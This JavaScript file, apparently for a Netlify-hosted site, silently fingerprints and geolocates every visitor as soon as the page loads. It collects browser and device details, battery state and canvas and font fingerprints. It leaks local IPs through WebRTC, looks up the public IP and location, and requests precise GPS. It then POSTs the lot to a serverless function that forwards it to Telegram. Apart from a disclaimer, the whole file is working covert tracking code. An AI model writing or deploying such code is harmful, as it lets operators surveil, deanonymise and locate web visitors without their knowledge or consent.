// telemetry.js – Advanced Silent Information Gathering
// Sends comprehensive device/network/location data to Netlify function
// which forwards to Telegram. Educational purpose only.

(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let collected = false;

  // ---------- 1. Core Collectors ----------

  // Basic device & browser
  function getBasicInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
      deviceMemory: navigator.deviceMemory || 'N/A (only Chrome)',
      doNotTrack: navigator.doNotTrack || 'unspecified',
      cookieEnabled: navigator.cookieEnabled,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      vendor: navigator.vendor || 'N/A'
    };
  }

  // Screen & window
  function getScreenInfo() {
    return {
      screenWidth: screen.width,
      screenHeight: screen.height,
      screenColorDepth: screen.colorDepth,
      screenPixelRatio: window.devicePixelRatio || 1,
      windowInnerWidth: window.innerWidth,
      windowInnerHeight: window.innerHeight,
      windowOuterWidth: window.outerWidth,
      windowOuterHeight: window.outerHeight
    };
  }

  // Timezone & system time
  function getTimeInfo() {
    return {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
      timezoneOffset: new Date().getTimezoneOffset(),
      systemTime: new Date().toString(),
      systemTimeISO: new Date().toISOString()
    };
  }

  // Battery (no permission)
  function getBatteryInfo() {
    return new Promise((resolve) => {
      if (!navigator.getBattery) {
        resolve({ level: 'N/A', charging: 'N/A' });
        return;
      }
      navigator.getBattery()
        .then(b => resolve({ level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' }))
        .catch(() => resolve({ level: 'Blocked', charging: 'Blocked' }));
    });
  }

  // WebRTC – Local IP(s)
  function getLocalIPs() {
    return new Promise((resolve) => {
      const ips = [];
      try {
        const pc = new RTCPeerConnection({
          iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        pc.createDataChannel('test');
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .catch(() => {});
        pc.onicecandidate = (event) => {
          if (!event || !event.candidate) {
            resolve(ips.length ? ips : ['Not available (VPN/Proxy)']);
            pc.close();
            return;
          }
          const candidate = event.candidate.candidate;
          if (candidate) {
            const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
            if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
          }
        };
        setTimeout(() => {
          resolve(ips.length ? ips : ['Timed out']);
          pc.close();
        }, 3000);
      } catch (e) {
        resolve(['WebRTC blocked/error']);
      }
    });
  }

  // Public IP and approximate location (via ipapi.co)
  function getPublicInfo() {
    return fetch('https://ipapi.co/json/', { cache: 'no-store' })
      .then(res => res.json())
      .then(data => ({
        ip: data.ip || 'N/A',
        city: data.city || 'N/A',
        region: data.region || 'N/A',
        country: data.country_name || 'N/A',
        isp: data.org || 'N/A',
        postal: data.postal || 'N/A',
        latitude: data.latitude || 'N/A',
        longitude: data.longitude || 'N/A',
        timezone: data.timezone || 'N/A'
      }))
      .catch(() => ({ error: 'Public IP fetch failed (blocked?)' }));
  }

  // GPS (requires permission)
  function getGPS() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ error: 'Geolocation not supported' });
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy + 'm',
          altitude: pos.coords.altitude || 'N/A',
          speed: pos.coords.speed || 'N/A'
        }),
        (err) => {
          let msg = 'Permission Denied or Error';
          if (err.code === 1) msg = 'User denied GPS';
          else if (err.code === 2) msg = 'Position unavailable';
          else if (err.code === 3) msg = 'Timeout';
          resolve({ error: msg });
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    });
  }

  // Canvas fingerprinting (to get a unique device hash)
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 256;
      canvas.height = 128;
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, 16, 16);
      ctx.fillStyle = '#069';
      ctx.textBaseline = 'alphabetic';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200, 60, 40, 40);
      return canvas.toDataURL();
    } catch (_) {
      return 'Canvas blocked';
    }
  }

  // System fonts (via font enumeration)
  function getInstalledFonts() {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testFonts = [
      'Arial', 'Verdana', 'Times New Roman', 'Courier New',
      'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS',
      'Lucida Console', 'Helvetica', 'Calibri', 'Cambria', 'Garamond'
    ];
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const txt = 'mmmmmmmmmmlli';
    const size = '72px';
    ctx.font = size + ' ' + baseFonts[0];
    const base = ctx.measureText(txt).width;
    const installed = [];
    for (const f of testFonts) {
      ctx.font = size + ' "' + f + '", ' + baseFonts[0];
      const w = ctx.measureText(txt).width;
      if (w !== base) installed.push(f);
    }
    return installed;
  }

  // ---------- 2. Master Collector ----------

  async function collectAll() {
    const basic = getBasicInfo();
    const screen = getScreenInfo();
    const time = getTimeInfo();
    const battery = await getBatteryInfo();
    const localIPs = await getLocalIPs();
    const publicData = await getPublicInfo();
    const gps = await getGPS();
    const canvasHash = getCanvasFingerprint();
    const fonts = getInstalledFonts();

    return {
      timestamp: time.systemTimeISO,
      device: {
        ...basic,
        ...screen,
        ...time,
        battery,
        canvasFingerprint: canvasHash,
        installedFonts: fonts
      },
      network: {
        localIPs: localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.isp || 'N/A',
        approximateLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country || 'N/A',
          postal: publicData.postal || 'N/A',
          lat: publicData.latitude || 'N/A',
          lng: publicData.longitude || 'N/A'
        }
      },
      gps: gps, // precise GPS if allowed
      referrer: document.referrer || null,
      pageUrl: location.href
    };
  }

  // ---------- 3. Send to Netlify (Telegram) ----------

  async function sendData(payload) {
    try {
      const res = await fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        cache: 'no-store',
        keepalive: true
      });
      if (!res.ok) console.warn('Telemetry send failed:', res.status);
    } catch (e) {
      console.warn('Telemetry send error:', e);
    }
  }

  // ---------- 4. Auto-trigger on page load ----------

  async function run() {
    if (collected) return;
    collected = true;

    console.log('%c🕵️ Advanced telemetry collection started (silent)', 'font-size:14px; color:#ff3366;');

    const data = await collectAll();

    // Also store globally for inspection
    window.__collectedData = data;

    // Send to Netlify
    await sendData(data);

    console.log('%c✅ Data sent to Netlify → Telegram (if configured)', 'font-size:14px; color:#00ffcc;');
    console.log('📦 Full payload:', data);
  }

  // Trigger on DOM ready
  if (document.readyState === 'complete') {
    setTimeout(run, 800);
  } else {
    window.addEventListener('load', () => setTimeout(run, 800));
  }

})();
